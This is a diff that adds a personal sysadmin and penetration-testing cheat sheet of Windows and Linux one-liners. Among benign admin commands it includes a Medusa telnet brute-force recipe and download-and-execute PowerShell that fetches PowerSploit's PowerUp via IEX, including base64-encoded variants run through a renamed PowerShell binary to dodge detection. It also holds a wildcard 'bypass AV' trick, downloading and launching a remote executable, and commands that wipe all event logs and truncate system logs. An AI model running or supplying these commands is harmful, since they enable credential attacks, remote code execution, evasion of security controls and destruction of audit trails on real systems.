@@ -1,4 +1,1268 @@
-https://rmccurdy.com/scripts/fu.txt
+https://rmccurdy.com/.scripts/fu.txt
+
+# some powershell 
+
+powershell  -ExecutionPolicy ByPass -NonInteractive -WindowStyle Hidden -command "& {mode con lines=1 cols=9999; Set-Variable -Name 'SNC_isWmi' -Value $true -Scope Global;  $os = gwmi win32_operatingsystem; if ($os.Name.Contains(\""Windows 2000\"")) {     netstat.exe -anp TCP; } else {    netstat.exe -anop TCP; }}"
+powershell  -ExecutionPolicy ByPass -NonInteractive -WindowStyle Hidden -command "& {mode con lines=1 cols=9999; Set-Variable -Name 'SNC_isWmi' -Value $true -Scope Global;  <# https://gallery.technet.microsoft.com/scriptcenter/Detect-Windows-Azure-aed06d51 #> $source = ' using System; using System.Collections.Generic; using System.Text; using System.Runtime.InteropServices; using System.ComponentModel; using System.Net.NetworkInformation;  namespace Microsoft.WindowsAzure.Internal {     public class DhcpClient : IDisposable     {         public DhcpClient()         {             uint version;             int err = NativeMethods.DhcpCApiInitialize(out version);             if (err != 0)                 throw new Win32Exception(err);         }          public void Dispose()         {             NativeMethods.DhcpCApiCleanup();         }          public static IEnumerable<NetworkInterface> GetDhcpInterfaces()         {             foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())             {                 if (nic.NetworkInterfaceType != NetworkInterfaceType.Ethernet) continue;                 if (!nic.Supports(NetworkInterfaceComponent.IPv4)) continue;                 IPInterfaceProperties props = nic.GetIPProperties();                 if (props == null) continue;                 IPv4InterfaceProperties v4props = props.GetIPv4Properties();                 if (v4props == null) continue;                 if (!v4props.IsDhcpEnabled) continue;                  yield return nic;             }         }          public byte[] DhcpRequestParams(string adapterName, uint optionId)         {             uint bufferSize = 1024;         Retry:             IntPtr buffer = Marshal.AllocHGlobal((int)bufferSize);             try             {                 NativeMethods.DHCPCAPI_PARAMS_ARRAY sendParams = new NativeMethods.DHCPCAPI_PARAMS_ARRAY();                 sendParams.nParams = 0;                 sendParams.Params = IntPtr.Zero;                  NativeMethods.DHCPCAPI_PARAMS recv = new NativeMethods.DHCPCAPI_PARAMS();                 recv.Flags = 0x0;                 recv.OptionId = optionId;                 recv.IsVendor = false;                 recv.Data = IntPtr.Zero;                 recv.nBytesData = 0;                  IntPtr recdParamsPtr = Marshal.AllocHGlobal(Marshal.SizeOf(recv));                 try                 {                     Marshal.StructureToPtr(recv, recdParamsPtr, false);                      NativeMethods.DHCPCAPI_PARAMS_ARRAY recdParams = new NativeMethods.DHCPCAPI_PARAMS_ARRAY();                     recdParams.nParams = 1;                     recdParams.Params = recdParamsPtr;                      NativeMethods.DhcpRequestFlags flags = NativeMethods.DhcpRequestFlags.DHCPCAPI_REQUEST_SYNCHRONOUS;                      int err = NativeMethods.DhcpRequestParams(                         flags,                         IntPtr.Zero,                         adapterName,                         IntPtr.Zero,                         sendParams,                         recdParams,                         buffer,                         ref bufferSize,                         null);                      if (err == NativeMethods.ERROR_MORE_DATA)                     {                         bufferSize *= 2;                         goto Retry;                     }                      if (err != 0)                         throw new Win32Exception(err);                      recv = (NativeMethods.DHCPCAPI_PARAMS)                          Marshal.PtrToStructure(recdParamsPtr, typeof(NativeMethods.DHCPCAPI_PARAMS));                      if (recv.Data == IntPtr.Zero)                         return null;                      byte[] data = new byte[recv.nBytesData];                     Marshal.Copy(recv.Data, data, 0, (int)recv.nBytesData);                     return data;                 }                 finally                 {                     Marshal.FreeHGlobal(recdParamsPtr);                 }             }             finally             {                 Marshal.FreeHGlobal(buffer);             }         }     }      internal static partial class NativeMethods     {         public const uint ERROR_MORE_DATA = 124;          [DllImport(\""dhcpcsvc.dll\"", EntryPoint = \""DhcpRequestParams\"", CharSet = CharSet.Unicode, SetLastError = false)]         public static extern int DhcpRequestParams(             DhcpRequestFlags Flags,             IntPtr Reserved,             string AdapterName,             IntPtr ClassId,             DHCPCAPI_PARAMS_ARRAY SendParams,             DHCPCAPI_PARAMS_ARRAY RecdParams,             IntPtr Buffer,             ref UInt32 pSize,             string RequestIdStr             );          [DllImport(\""dhcpcsvc.dll\"", EntryPoint = \""DhcpUndoRequestParams\"", CharSet = CharSet.Unicode, SetLastError = false)]         public static extern int DhcpUndoRequestParams(             uint Flags,             IntPtr Reserved,             string AdapterName,             string RequestIdStr);          [DllImport(\""dhcpcsvc.dll\"", EntryPoint = \""DhcpCApiInitialize\"", CharSet = CharSet.Unicode, SetLastError = false)]         public static extern int DhcpCApiInitialize(out uint Version);          [DllImport(\""dhcpcsvc.dll\"", EntryPoint = \""DhcpCApiCleanup\"", CharSet = CharSet.Unicode, SetLastError = false)]         public static extern int DhcpCApiCleanup();          [Flags]         public enum DhcpRequestFlags : uint         {             DHCPCAPI_REQUEST_PERSISTENT = 0x01,             DHCPCAPI_REQUEST_SYNCHRONOUS = 0x02,             DHCPCAPI_REQUEST_ASYNCHRONOUS = 0x04,             DHCPCAPI_REQUEST_CANCEL = 0x08,             DHCPCAPI_REQUEST_MASK = 0x0F         }          [StructLayout(LayoutKind.Sequential)]         public struct DHCPCAPI_PARAMS_ARRAY         {             public UInt32 nParams;             public IntPtr Params;         }          [StructLayout(LayoutKind.Sequential)]         public struct DHCPCAPI_PARAMS         {             public UInt32 Flags;             public UInt32 OptionId;             [MarshalAs(UnmanagedType.Bool)]              public bool IsVendor;             public IntPtr Data;             public UInt32 nBytesData;         }     } } ';  Add-Type -TypeDefinition $source; Add-Type -TypeDefinition $source;  Function Confirm-AzureVM { \u0009 \u0009$detected = $False;  \u0009[void][System.Reflection.Assembly]::LoadWithPartialName('System.Serviceprocess');  \u0009$vmbus = [System.ServiceProcess.ServiceController]::GetDevices() | where {$_.Name -eq 'vmbus'};  \u0009If($vmbus.Status -eq 'Running') \u0009{ \u0009\u0009$client = New-Object Microsoft.WindowsAzure.Internal.DhcpClient; \u0009\u0009try { \u0009\u0009\u0009[Microsoft.WindowsAzure.Internal.DhcpClient]::GetDhcpInterfaces() | % {  \u0009\u0009\u0009\u0009$val = $client.DhcpRequestParams($_.Id, 245); \u0009\u0009\u0009\u0009if($val -And $val.Length -eq 4) { \u0009\u0009\u0009\u0009\u0009$detected = $True; \u0009\u0009\u0009\u0009} \u0009\u0009\u0009} \u0009\u0009} finally { \u0009\u0009\u0009$client.Dispose(); \u0009\u0009}\u0009 \u0009} \u0009Write-Output $detected; } Confirm-AzureVm;}"
+powershell  -ExecutionPolicy ByPass -NonInteractive -WindowStyle Hidden -command "& {mode con lines=1 cols=9999; Set-Variable -Name 'SNC_isWmi' -Value $true -Scope Global;  function printValues{Process{foreach-object{if($_.Properties){$a=$_.Properties}else{$a=$_.PsObject.Properties}foreach($p in $a){$o=$p.Name+' : ';if ($p.Value -is [Array]){$o+=[string]::Join(',', $p.Value);}else{$o+=$p.Value;}$o;if($p.Value -is [System.Management.ManagementBaseObject] -or $p.Value -is [System.Management.ManagementBaseObject[]]){'_EXTENDED_START:';$p.Value|printValues;'_EXTENDED_END!';}}}}}gwmi -namespace root/MSCluster MSCluster_Cluster -EA SilentlyContinue|select __CLASS,Name|printValues|format-list;gwmi -namespace root/MSCluster MSCluster_ClusterToResource -EA SilentlyContinue|select __CLASS,GroupComponent,PartComponent|printValues|format-list;gwmi -namespace root/MSCluster MSCluster_ClusterToNode -EA SilentlyContinue|select __CLASS,Antecedent,Dependent|printValues|format-list;gwmi -namespace root/virtualization/v2 Msvm_ComputerSystem -EA SilentlyContinue|select __CLASS,Name|printValues|format-list;gwmi -namespace root/virtualization Msvm_ComputerSystem -EA SilentlyContinue|select __CLASS,Name|printValues|format-list;gwmi -namespace root/MSCluster MSCluster_Resource -EA SilentlyContinue|select __CLASS,PrivateProperties,Name,Type|printValues|format-list;gwmi -namespace root\cimv2 Win32_ComputerSystem -EA SilentlyContinue|select __CLASS,Domain,Name|printValues|format-list;gwmi -namespace root\cimv2 Win32_OperatingSystem -EA SilentlyContinue|select __CLASS,Caption,Version|printValues|format-list;gwmi -namespace root/MSCluster MSCluster_Node -EA SilentlyContinue|select __CLASS,Name|printValues|format-list;'---SNC-SEPERATOR---REGISTRY-SECTION---';Get-ItemProperty -Path 'HKLM:/SYSTEM/CurrentControlSet/Services/Tcpip/Parameters' -EA SilentlyContinue|select PSPath,Domain,Hostname|format-list;}"
+powershell  -ExecutionPolicy ByPass -NonInteractive -WindowStyle Hidden -command "& {mode con lines=1 cols=9999; Set-Variable -Name 'SNC_isWmi' -Value $true -Scope Global;  function printValues{Process{foreach-object{if($_.Properties){$a=$_.Properties}else{$a=$_.PsObject.Properties}foreach($p in $a){$o=$p.Name+' : ';if ($p.Value -is [Array]){$o+=[string]::Join(',', $p.Value);}else{$o+=$p.Value;}$o;if($p.Value -is [System.Management.ManagementBaseObject] -or $p.Value -is [System.Management.ManagementBaseObject[]]){'_EXTENDED_START:';$p.Value|printValues;'_EXTENDED_END!';}}}}}gwmi -namespace root\cimv2 Win32_BIOS -EA SilentlyContinue|select __CLASS,SMBIOSBIOSVersion|printValues|format-list;'---SNC-SEPERATOR---REGISTRY-SECTION---';}"
+powershell  -ExecutionPolicy ByPass -NonInteractive -WindowStyle Hidden -command "& {mode con lines=1 cols=9999; Set-Variable -Name 'SNC_isWmi' -Value $true -Scope Global;  function printValues{Process{foreach-object{if($_.Properties){$a=$_.Properties}else{$a=$_.PsObject.Properties}foreach($p in $a){$o=$p.Name+' : ';if ($p.Value -is [Array]){$o+=[string]::Join(',', $p.Value);}else{$o+=$p.Value;}$o;if($p.Value -is [System.Management.ManagementBaseObject] -or $p.Value -is [System.Management.ManagementBaseObject[]]){'_EXTENDED_START:';$p.Value|printValues;'_EXTENDED_END!';}}}}}gwmi -namespace root\cimv2 Win32_ComputerSystem -EA SilentlyContinue|select __CLASS,Manufacturer,Model,UserName|printValues|format-list;gwmi -namespace root\cimv2 Win32_OperatingSystem -EA SilentlyContinue|select __CLASS,Version,CSDVersion,Description|printValues|format-list;gwmi -namespace root\cimv2 Win32_Processor -EA SilentlyContinue|select __CLASS,AddressWidth|printValues|format-list;'---SNC-SEPERATOR---REGISTRY-SECTION---';}"
+powershell  -ExecutionPolicy ByPass -NonInteractive -WindowStyle Hidden -command "& {mode con lines=1 cols=9999; Set-Variable -Name 'SNC_isWmi' -Value $true -Scope Global;  function printValues{Process{foreach-object{if($_.Properties){$a=$_.Properties}else{$a=$_.PsObject.Properties}foreach($p in $a){$o=$p.Name+' : ';if ($p.Value -is [Array]){$o+=[string]::Join(',', $p.Value);}else{$o+=$p.Value;}$o;if($p.Value -is [System.Management.ManagementBaseObject] -or $p.Value -is [System.Management.ManagementBaseObject[]]){'_EXTENDED_START:';$p.Value|printValues;'_EXTENDED_END!';}}}}}gwmi -namespace root\cimv2 Win32_ComputerSystemProduct -EA SilentlyContinue|select __CLASS,IdentifyingNumber,UUID|printValues|format-list;gwmi -namespace root\cimv2 Win32_SystemEnclosure -EA SilentlyContinue|select __CLASS,ChassisTypes,SerialNumber|printValues|format-list;gwmi -namespace root\cimv2 Win32_BIOS -EA SilentlyContinue|select __CLASS,SerialNumber|printValues|format-list;gwmi -namespace root\cimv2 Win32_BaseBoard -EA SilentlyContinue|select __CLASS,SerialNumber|printValues|format-list;'---SNC-SEPERATOR---REGISTRY-SECTION---';}"
+powershell  -ExecutionPolicy ByPass -NonInteractive -WindowStyle Hidden -command "& {mode con lines=1 cols=9999; Set-Variable -Name 'SNC_isWmi' -Value $true -Scope Global;  function printValues{Process{foreach-object{if($_.Properties){$a=$_.Properties}else{$a=$_.PsObject.Properties}foreach($p in $a){$o=$p.Name+' : ';if ($p.Value -is [Array]){$o+=[string]::Join(',', $p.Value);}else{$o+=$p.Value;}$o;if($p.Value -is [System.Management.ManagementBaseObject] -or $p.Value -is [System.Management.ManagementBaseObject[]]){'_EXTENDED_START:';$p.Value|printValues;'_EXTENDED_END!';}}}}}gwmi -namespace root\cimv2 Win32_OperatingSystem -EA SilentlyContinue|select __CLASS,Caption,Version|printValues|format-list;'---SNC-SEPERATOR---REGISTRY-SECTION---';Get-ItemProperty -Path 'HKLM:/Software/Microsoft/Office/*/Registration/*' -EA SilentlyContinue|select PSPath,ProductID,DigitalProductID|format-list;Get-ItemProperty -Path 'HKLM:/Software/Microsoft/Windows/CurrentVersion/Installer/UserData/*/Products/*/InstallProperties' -EA SilentlyContinue|select PSPath,InstallDate,Publisher,ProductID,DisplayName,DisplayVersion|format-list;Get-ItemProperty -Path 'HKLM:/Software/Microsoft/Windows NT/CurrentVersion' -EA SilentlyContinue|select PSPath,ProductId,DigitalProductID|format-list;Get-ItemProperty -Path 'HKLM:/Software/Microsoft/Internet Explorer/Registration' -EA SilentlyContinue|select PSPath,ProductId|format-list;Get-ItemProperty -Path 'HKLM:/Software/Microsoft/Windows/CurrentVersion' -EA SilentlyContinue|select PSPath,ProductId|format-list;Get-ItemProperty -Path 'HKLM:/Software/Wow6432Node/Microsoft/Office/*/Registration/*' -EA SilentlyContinue|select PSPath,DigitalProductID,ProductID|format-list;Get-ItemProperty -Path 'HKLM:/Software/Wow6432Node/Microsoft/Windows/CurrentVersion/Uninstall/*' -EA SilentlyContinue|select PSPath,InstallDate,DisplayName,DisplayVersion,ParentDisplayName,Publisher,UninstallString|format-list;Get-ItemProperty -Path 'HKLM:/Software/Microsoft/Internet Explorer' -EA SilentlyContinue|select PSPath,Version,svcVersion|format-list;Get-ItemProperty -Path 'HKLM:/Software/Wow6432Node/Microsoft/Windows/CurrentVersion/Installer/UserData/*/Products/*/InstallProperties' -EA SilentlyContinue|select PSPath,InstallDate,DisplayName,DisplayVersion,ProductID,Publisher|format-list;Get-ItemProperty -Path 'HKLM:/Software/Microsoft/Windows/CurrentVersion/Uninstall/*' -EA SilentlyContinue|select PSPath,ParentDisplayName,InstallDate,DisplayName,DisplayVersion,Publisher,UninstallString|format-list;}"
+powershell  -ExecutionPolicy ByPass -NonInteractive -WindowStyle Hidden -command "& {mode con lines=1 cols=9999; Set-Variable -Name 'SNC_isWmi' -Value $true -Scope Global;  function printValues{Process{foreach-object{if($_.Properties){$a=$_.Properties}else{$a=$_.PsObject.Properties}foreach($p in $a){$o=$p.Name+' : ';if ($p.Value -is [Array]){$o+=[string]::Join(',', $p.Value);}else{$o+=$p.Value;}$o;if($p.Value -is [System.Management.ManagementBaseObject] -or $p.Value -is [System.Management.ManagementBaseObject[]]){'_EXTENDED_START:';$p.Value|printValues;'_EXTENDED_END!';}}}}}gwmi -namespace root\cimv2 Win32_Printer -EA SilentlyContinue|select __CLASS,Name,DeviceID,PortName|printValues|format-list;gwmi -namespace root\cimv2 Win32_TCPIPPrinterPort -EA SilentlyContinue|select __CLASS,Name,HostAddress|printValues|format-list;'---SNC-SEPERATOR---REGISTRY-SECTION---';}"
+powershell  -ExecutionPolicy ByPass -NonInteractive -WindowStyle Hidden -command "& {mode con lines=1 cols=9999; Set-Variable -Name 'SNC_isWmi' -Value $true -Scope Global;  function printValues{Process{foreach-object{if($_.Properties){$a=$_.Properties}else{$a=$_.PsObject.Properties}foreach($p in $a){$o=$p.Name+' : ';if ($p.Value -is [Array]){$o+=[string]::Join(',', $p.Value);}else{$o+=$p.Value;}$o;if($p.Value -is [System.Management.ManagementBaseObject] -or $p.Value -is [System.Management.ManagementBaseObject[]]){'_EXTENDED_START:';$p.Value|printValues;'_EXTENDED_END!';}}}}}gwmi -namespace root\cimv2 Win32_Process -EA SilentlyContinue|select __CLASS,Caption,CommandLine,CreationDate,Description,ExecutablePath,Name,ParentProcessId,ProcessId,Priority|printValues|format-list;'---SNC-SEPERATOR---REGISTRY-SECTION---';}"
+
+
+# How do I PERMANENTLY disable Window Ink for Windows 10 Pro 1803
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Pen /v LegacyPenInteractionModel /t REG_DWORD /d 1 /f
+
+# telnet is fail for nmap and ncrack also try https://github.com/lanjelot/patator
+wget 'https://rmccurdy.com/.scripts/downloaded/medusa_wordlist_telnet.txt'
+medusa -M telnet -H in -C medusa_wordlist_telnet.txt -T 16 -L | tee out.txt
+grep SUCC  out.txt  |grep -v AUR | awk '{print $5,$7,$9}' |sed 's/ /,/g'| sed 's/\[SUCCESS\]//g' > out.csv
+
+
+# macOS ports MAC ports Apple Ports reference: https://support.apple.com/en-us/HT202944
+
+
+#all
+7,20-23,25,53,67-69,79-80,88,106,110-111,113,119,123,137-139,143,161,192,311-312,389,427,443,445,464-465,500,514-515,532,548,554,587,600-1023,1085,1099,1220,1640,1649,1701,1723,1900,2049,2195-2197,2336,3004,3031,3283-3284,3306,3478-3497,3632,3659,3689-3690,4111,4398,4488,4500,5003,5009,5100,5222-5223,5228,5297,5350-5351,5353,5432,5897-5898,5900,5988,6970-9999,10548,11211,16080,16384-16472,24000-24999,42000-42999,50003,50006
+
+# comon mac OS ports
+22,23,53,80,88,111,139,443,445,515,548,631,880,881,986,993,999,1017,1021,1023,2049,3031,3283,3306,5900,7040,7041,8000,8080,8083,8282,8443,8733,9000,9002,9006,9007,9010,9011,9013,9014,9015,9017,9018,9019,9022,9023,9090,9100
+
+#zsh oh-my-zsh
+sh -c "$(curl -A OHMY -kL https://rmccurdy.com/.scripts/zsh)" 
+
+# 'clean malware'
+find . -type f -name '*.zip' -print0 | xargs -0 rename 's/.zip$/.zi_/'
+find . -type f -name '*.exe' -print0 | xargs -0 rename 's/.exe$/.ex_/'
+# teams 
+
+taskkill /F /IM outlook.exe
+taskkill /F /IM chrome.exe
+taskkill /F /IM Teams.exe
+
+rd /q/s "%userprofile%\AppData\Roaming\Microsoft\Teams"
+
+start "%userprofile%\AppData\Local\Microsoft\Teams\current\Teams.exe"
+ 
+
+# find out what site is taking you where (does not work with java or refresh HTML script etc 
+curl -ikLv newellbrandsmarketingresources.com >curl-output.txt 2>&1 ; grep -Eia  "(30[1-2]|Host:|Location:|type=\"hidden)" curl-output.txt
+
+#dump 'good' movies
+curl   -s -k       -H $'Response: application/json' 'https://flickmetrix.com/api/values/getFilms?amazonRegion=us&cast=&comboScoreMax=100&comboScoreMin=65&countryCode=us&currentPage=0&deviceID=1&director=&excludeGenres=Biography&excludeGenres=Documentary&excludeGenres=Horror&genreAND=false&imdbRatingMax=10&imdbRatingMin=0&imdbVotesMax=1600000&imdbVotesMin=0&inCinemas=true&includeDismissed=false&includeSeen=false&includeWantToWatch=false&isCastSearch=false&isDirectorSearch=false&language=all&letterboxdScoreMax=100&letterboxdScoreMin=0&letterboxdVotesMax=1400000&letterboxdVotesMin=0&metacriticMax=100&metacriticMin=0&netflixRegion=us&onAmazonPrime=false&onAmazonVideo=false&onDVD=false&onNetflix=false&pageSize=20&plot=&popularityMax=100&popularityMin=0&queryType=GetFilmsToSieve&rtCriticFreshMax=300&rtCriticFreshMin=0&rtCriticMeterMax=100&rtCriticMeterMin=0&rtCriticRatingMax=10&rtCriticRatingMin=0&rtCriticReviewsMax=400&rtCriticReviewsMin=50&rtCriticRottenMax=200&rtCriticRottenMin=0&rtUserMeterMax=100&rtUserMeterMin=0&rtUserRatingMax=5&rtUserRatingMin=0&rtUserReviewsMax=40000000&rtUserReviewsMin=0&searchTerm=&sortOrder=dateDesc&title=&token=&watchedRating=0&writer=&yearMax=2019&yearMin=2018' | awk '{gsub(",\\\\\"","\n"); print}'     |  grep -E "(Title)"  | sed 's/[\\|\"]//g' | sed 's/Title://g' 
+
+#popular movies StevenLu
+https://s3.amazonaws.com/popular-movies/movies.json
+
+
+#find files to clean up
+find / -type f -size +30M ! -path "/media/*"
+
+# clean var/log syslog rsyslog messages
+find /var/log -type f -exec truncate   '{}'  --size 0  \;
+systemctl restart rsyslog 
+
+
+#force mount ntfs
+mkdir /s
+mount -t ntfs-3g /dev/sda2 /s -o remove_hiberfile
+umount /s
+ntfsfix /dev/sda2
+mount -t ntfs-3g /dev/sda2 /s -o remove_hiberfile
+
+#tots not powershell !
+powershell (new-object System.Net.WebClient).DownloadFile('https://rmccurdy.com/scripts/Not_Powershell_or_RmcCurdy.exe','%TEMP%\Not_Powershell_or_RmcCurdy.exe');
+
+# current powerup
+Not_Powershell_or_RmcCurdy.exe -encodedcommand "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABFAG0AcABpAHIAZQAvAFAAbwB3AGUAcgBUAG8AbwBsAHMALwBtAGEAcwB0AGUAcgAvAFAAbwB3AGUAcgBVAHAALwBQAG8AdwBlAHIAVQBwAC4AcABzADEAJwApADsASQBuAHYAbwBrAGUALQBBAGwAbABDAGgAZQBjAGsAcwA="
+
+# alternate dev
+Not_Powershell_or_RmcCurdy.exe -encodedcommand "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBkAGUAdgAvAFAAcgBpAHYAZQBzAGMALwBQAG8AdwBlAHIAVQBwAC4AcABzADEAJwApADsASQBuAHYAbwBrAGUALQBBAGwAbABDAGgAZQBjAGsAcwA="
+
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1');Invoke-AllChecks"
+
+
+
+
+#bypass AV checks
+Ughâ€¦.launching executables with wildcards â€¦sounds like a great idea ! 
+
+https://twitter.com/omespino/status/1082361280248336384?s=19
+
+ @^p^o^w^e^r^shell c:\*\*32\c*?c.e?e
+C:\>powershell C:\??*?\*3?\c?lc.?x? calc
+C:\>powershell C:\*\*2\n??e*d.* notepad
+C:\>powershell C:\*\*2\t?s*r.* taskmgr
+
+#wake up !
+powershell (new-object System.Net.WebClient).DownloadFile('https://www.rmccurdy.com/scripts/c0ffee_F22.ex_','%TEMP%\c0ffee.exe');Start-Process "%TEMP%\c0ffee_F22.exe"
+
+#list USB info and speeds
+
+dmesg | grep " usb [0-9]" |less ;for i in `find /sys/bus/usb/devices -iname "usb*" ` ;do echo $i ;cat $i/speed ;done
+
+
+#powershell wipe all event logs
+powershell -command "    wevtutil el | Foreach-Object {Write-Host "Clearing $_"; wevtutil cl "$_"}     "
+
+
+
+#powershell to get external IP
+powershell -command "$(Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress
+
+# dump non common services > CSV 
+powershell -command "              $service = get-wmiobject -query 'select * from win32_service'; echo $service.pathname |select-string -Pattern 'system32|c:\windows\system32|TrustedInstaller|SysWow64' -NotMatch | export-csv "$env:TEMP\out.csv" -nti |start "$env:TEMP\out.csv"       "
+
+# (better ?) dump running services to CSV
+wmic  service where (state="running") get name, Pathname /format:csv|find /V /I "System"  > out.csv & start out.csv
+
+
+#expand svchost.exe
+tasklist /FO CSV /svc /fi "imagename eq svchost.exe" >  svchost.csv
+
+
+# buncha WMI
+Spot Odd Executables - wmic PROCESS WHERE "NOT ExecutablePath LIKE '%Windows%'" GET ExecutablePath
+Look at services that are set to start automatically - wmic SERVICE WHERE StartMode="Auto" GET Name, State
+Find user-created shares (usually not hidden) - wmic SHARE WHERE "NOT Name LIKE '%$'" GET Name, Path
+Find stuff that starts on boot - wmic STARTUP GET Caption, Command, User
+Identify any local system accounts that are enabled (guest, etc.) - wmic USERACCOUNT WHERE "Disabled=0 AND LocalAccount=1" GET Name"
+Change Start Mode of Service - wmic service where (name like "Fax" OR name like "Alerter") CALL ChangeStartMode Disabled
+Number of Logons Per USERID - wmic netlogin where (name like "%skodo") get numberoflogons
+Obtain a Certain Kind of Event from Eventlog - wmic ntevent where (message like "%logon%") list brief
+Clear the Eventlog (Security example) - wmic nteventlog where (description like "%secevent%") call cleareventlog
+Get Mac Address - wmic nic get macaddress
+Reboot or Shutdown - wmic os where buildnumber="2600" call reboot
+Update static IP address - wmic nicconfig where index=9 call enablestatic("192.168.16.4"), ("255.255.255.0")
+Change network gateway - wmic nicconfig where index=9 call setgateways("192.168.16.4", "192.168.16.5"),(1,2)
+Enable DHCP - wmic nicconfig where index=9 call enabledhcp
+Service Management - wmic service where caption="DHCP Client" call changestartmode "Disabled"
+Start an Application - wmic process call create "calc.exe"
+Terminate an Application - wmic process where name="calc.exe" call terminate
+Change Process Priority - wmic process where name="explorer.exe" call setpriority 64
+Get List of Process Identifiers - wmic process where (Name='svchost.exe') get name,processid
+Information About Harddrives - wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber
+Information about os - wmic os get bootdevice, buildnumber, caption, freespaceinpagingfiles, installdate, name, systemdrive, windowsdirectory /format:htable > c:osinfo.htm
+Information about files - wmic path cim_datafile where "Path='windowssystem32wbem' and FileSize>1784088" > c:wbemfiles.txt
+Process list - wmic process get /format:htable > c:process.htm
+Retrieve list of warning and error events not from system or security logs - WMIC NTEVENT WHERE "EventType<3 AND LogFile != 'System' AND LogFile != 'Security'" GET LogFile, SourceName, EventType, Message, TimeGenerated /FORMAT:"htable.xsl":" datatype = number":" sortby = EventType" > c:appevent.htm
+Total Hard Drive Space Check - wmic LOGICALDISK LIST BRIEF
+Get Running Services Information - Wmic service where (state=â€runningâ€) get caption, name, startmode, state
+Get Startmode of Services - Wmic service get caption, name, startmode, state
+Get Domain Names And When Account PWD set to Expire - WMIC UserAccount GET name,PasswordExpires /Value
+Get Hotfix and Security Patch Information - WMIC QFE GET /format:CSV >QFE.CSV
+Get Startup List - wmic startup list full
+Find a specific Process - wmic process list brief - find "cmd.exe"
+Get List of IP Interfaces - wmic nicconfig where IPEnabled='true'
+Change IP Address - wmic nicconfig where Index=1 call EnableStatic ("10.10.10.10"), ("255.255.255.0")
+OS/System Report HTML Formatted - wmic /output:c:os.html os get /format:hform
+Products/Programs Installed Report HTML Formatted - wmic /output:c:product.html product get /format:hform
+Services Report on a Remote Machine HTML Formatted - wmic /output:c:services.htm /node:server1 service list full / format:htable
+Turn on Remoted Desktop Remotely! - Wmic /node:"servername" /user:"user@domain" /password: "password"
+RDToggle where ServerName="server name" call SetAllowTSConnections 1
+Get Server Drive Space Usage Remotely - WMIC /Node:%%A LogicalDisk Where DriveType="3" Get DeviceID,FileSystem,FreeSpace,Size /Format:csv MORE /E +2 >> SRVSPACE.CSV
+Get PC Serial Number - wmic /node:â€HOSTâ€ bios get serialnumber
+Get PC Product Number - wmic /node:â€HOSTâ€ baseboard get product
+Get Services for Remote Machine in HTML Format - wmic /output:c:services.htm /node:server1 service list full / format:htable
+
+
+# packet captures in windows! sort of ... pcap windows
+ 
+$timestamp = Get-Date -f yyyy-MM-dd_HH-mm-ss
+New-NetEventSession -Name Session1 -LocalFilePath c:\$env:computername-netcap.etl  -MaxFileSize 512
+ 
+Add-NetEventPacketCaptureProvider -SessionName Session1 
+Start-NetEventSession -Name Session1 
+
+Start-Sleep -s 15
+
+#Stop a Capture Session 
+Stop-NetEventSession -Name Session1
+#Remove Capture Session
+Remove-NetEventSession -Name Session1 
+
+
+
+$s = New-PefTraceSession -Path â€œ$env:computername-netcap.etl.Capâ€ -SaveOnStop
+$s | Add-PefMessageProvider -Provider â€œ$env:computername-netcap.etlâ€
+$s | Start-PefTraceSession
+
+
+
+
+#action center enable
+Reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ImmersiveShell" /v "UseWin32BatteryFlyout" /t REG_DWORD /d "1" /f
+Reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\MTCUVC" /v "EnableMtcUvc" /t REG_DWORD /d "0" /f
+reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter" /t REG_DWORD /d 0 /f
+
+
+# wmic dump dns
+FOR /F "delims==" %%A IN ('type ips.txt') DO  wmic /Node:%%A >wmic nicconfig where "IPEnabled = 'TRUE' and DNSDomain IS NOT NULL" get DNSHostName,DefaultIPGateway, DHCPServer, DNSDomain, DNSHostName, DNSServerSearchOrder, IPAddress, IPSubnet, MACAddress, WINSEnableLMHostsLookup, WINSPrimaryServer, WINSSecondaryServer /format:list   >> \\pmfile02\knox\RMCCURDY\dns.txt
+
+#powershell dump DNS info for all on domain
+ForEach ($Computer In Get-ADComputer -Filter * -Properties *)
+{
+  Try
+  {
+   
+Get-WmiObject -ComputerName $Computer.Name -Namespace root\cimv2 -Query "Select dnsserversearchorder from win32_networkadapterconfiguration" | where {$_.DNSServerSEarchOrder -ne $null} | select -ExpandProperty DNSServerSearchOrder
+Get-ADComputer -Identity $Computer.Name -Properties Name, operatingSystem |Select Name, operatingSystem
+    
+
+
+  }
+  Catch
+  {
+    $Computer.Name + " not in AD"
+  }
+}
+
+#7zip folder with exclude files
+7z a -tzip archive.zip usb -mx0 '-xr!DERP.tar.gz'
+
+
+# powershell to dump AD info on managers etc
+Get-ADOrganizationalUnit -filter * -Properties DistinguishedName | get-aduser -filter *  -properties * |select EmailAddress,title,Company,samaccountname,office,displayname,@{Name = "Manager";Expression = {%{(Get-AdUser $_.Manager -Properties DisplayName).DisplayName}}}| export-csv "$env:TEMP\list.csv" -nti 
+start "$env:TEMP\list.csv"
+
+
+
+# dump info using direct X
